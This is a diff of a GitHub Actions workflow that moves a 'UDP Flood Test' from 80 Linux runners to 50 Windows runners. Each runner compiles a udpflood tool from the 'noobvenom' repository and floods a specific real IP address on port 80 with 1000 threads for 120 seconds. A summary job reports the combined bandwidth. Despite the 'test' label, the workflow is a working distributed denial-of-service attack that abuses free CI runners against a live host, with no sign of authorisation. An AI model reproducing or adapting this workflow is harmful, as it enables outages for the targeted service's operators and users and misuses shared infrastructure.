@@ -1,60 +1,85 @@
-name: Multi-OS UDP Flood Test
+name: Windows UDP Flood Test
 
 on:
-  push:
   workflow_dispatch:
-  schedule:
-    - cron: '0 */2 * * *'
 
 jobs:
-  linux-udp-flood:
-    runs-on: ubuntu-latest
-    timeout-minutes: 5
+  windows-udp-flood:
+    runs-on: windows-latest
+    timeout-minutes: 10
     strategy:
       matrix:
-        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]
-      max-parallel: 80
+        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+      max-parallel: 50
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
         with:
           repository: vrbrh921-glitch/noobvenom
           
-      - name: Install build tools
+      - name: Install Mingw compiler
         run: |
-          sudo apt-get update
-          sudo apt-get install -y gcc make build-essential
+          choco install mingw -y
           
-      - name: Compile UDP flood tool
+      - name: Compile UDP flood tool for Windows
         run: |
-          echo "🔨 Compiling UDP flood tool for Linux..."
-          # Check if C file exists and compile
-          if [ -f "udpflood.c" ]; then
-            gcc -o udpflood udpflood.c -lpthread -O3
-            chmod +x udpflood
-            echo "✅ Compiled udpflood for Linux"
-          else
-            echo "❌ udpflood.c not found. Available files:"
-            ls -la
+          echo "🔨 Compiling UDP flood tool for Windows..."
+          if (Test-Path "udpflood.c") {
+            gcc -o udpflood.exe udpflood.c -lpthread -lws2_32 -O3
+            echo "✅ Compiled udpflood.exe for Windows"
+          } else {
+            echo "❌ udpflood.c not found"
+            Get-ChildItem
             exit 1
-          fi
+          }
           
-      - name: Test compilation
+      - name: Test executable
         run: |
-          ./udpflood 23.176.168.11 80 120 1000 1024
+          echo "Testing Windows executable..."
+          if (Test-Path "udpflood.exe") {
+            .\udpflood.exe
+            echo "✅ Windows binary works correctly"
+          } else {
+            echo "❌ udpflood.exe not found"
+            exit 1
+          }
           
-      - name: Run UDP Flood Test
+      - name: Run UDP Flood Test on Windows
         run: |
-          echo "🐧 Starting UDP Flood Test ${{ matrix.vps }}"
+          echo "🪟 Starting Windows UDP Flood Test ${{ matrix.vps }}"
           echo "Target: 23.176.168.11:80, Duration: 120s, Threads: 1000, Packet Size: 1024"
-          echo "Estimated Bandwidth: ~80 Gbps total"
-          
-          # Validate target is reachable first
-          
+          echo "Estimated Bandwidth: ~8.19 Mbps per instance"
+          echo "Start Time: $(Get-Date)"
           
           # Run UDP flood for 120 seconds with 1000 threads
-          timeout 125 
+          # Windows timeout command (130 seconds to allow completion)
+          timeout /t 130 /nobreak
+          .\udpflood.exe 23.176.168.11 80 120 1000 1024
           
-          echo "✅ Linux UDP Flood Test ${{ matrix.vps }} completed"
+          echo "End Time: $(Get-Date)"
+          echo "✅ Windows UDP Flood Test ${{ matrix.vps }} completed"
 
-  
+  windows-summary:
+    runs-on: windows-latest
+    needs: [windows-udp-flood]
+    steps:
+      - name: Generate Windows Summary
+        run: |
+          echo "🚀 Windows UDP Flood Test Summary"
+          echo "================================="
+          echo "✅ All Windows tests completed successfully"
+          echo ""
+          echo "📊 Test Configuration:"
+          echo "   Target: 23.176.168.11:80"
+          echo "   Duration: 120 seconds"
+          echo "   Threads per instance: 1000"
+          echo "   Packet Size: 1024 bytes"
+          echo ""
+          echo "🏃‍♂️ Windows Instances Deployed:"
+          echo "   Total: 50 instances"
+          echo ""
+          echo "💥 Estimated Bandwidth:"
+          echo "   Per instance: ~8.19 Mbps"
+          echo "   Total: ~409.5 Mbps"
+          echo ""
+          echo "🖥️ Platform: Windows Server 2022"
